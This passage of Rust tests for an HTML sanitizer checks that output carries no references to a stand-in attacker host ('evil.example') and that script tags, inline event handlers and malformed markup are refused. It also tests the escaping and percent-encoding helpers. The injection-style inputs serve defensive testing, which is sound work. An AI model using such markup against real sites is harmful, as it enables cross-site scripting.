                                    || !value.to_ascii_lowercase().contains("evil.example"),
                                "{name}={value:?} from {snippet:?}"
                            );
                        }
                    }
                    assert!(
                        styles
                            .iter()
                            .all(|css| !css.to_ascii_lowercase().contains("evil.example"))
                    );
                }
                assert!(sanitized.inline.iter().all(|id| id == "logo"));
            }
        }
    }

    #[test]
    fn the_second_pass_refuses_markup_it_was_not_written_for() {
        // What the first pass writes is regular. Anything else handed to
        // the second is refused whole, not patched up.
        for markup in [
            "<p onclick=\"x\">",
            "<script>x</script>",
            "<p class=x>",
            "<p class='x'>",
            "<p  class=\"x\">",
            "<P>",
            "<p",
            "<p class=\"x",
            "<style>p{}",
            "</script>",
            "<svg>",
        ] {
            let options = options(false);
            let mut rewriter = Rewriter {
                options: &options,
                blocked: 0,
                inline: Vec::new(),
                out: String::new(),
            };
            assert_eq!(rewriter.run(markup), None, "{markup:?}");
        }
    }

    #[test]
    fn helpers_read_back_what_they_wrote() {
        for text in [
            "",
            "plain",
            "a & b < c > d \"e\"",
            "&amp;",
            "\u{a0}",
            "x&y;z&",
        ] {
            assert_eq!(unescape(&escape(text, true)), text);
        }
        assert_eq!(
            unescape("a&nbsp;b&amp;amp;&bogus;&"),
            "a\u{a0}b&amp;&bogus;&"
        );
        assert_eq!(percent_decode("logo%40example.com"), "logo@example.com");
        assert_eq!(percent_decode("100%"), "100%");
        assert_eq!(percent_decode("%zz%4"), "%zz%4");
        assert_eq!(percent_decode("%ff%fe"), "%ff%fe");
        assert_eq!(percent_encode("a b/c%.png"), "a%20b%2Fc%25.png");
        assert_eq!(percent_encode("résumé.pdf"), "r%C3%A9sum%C3%A9.pdf");
    }
}
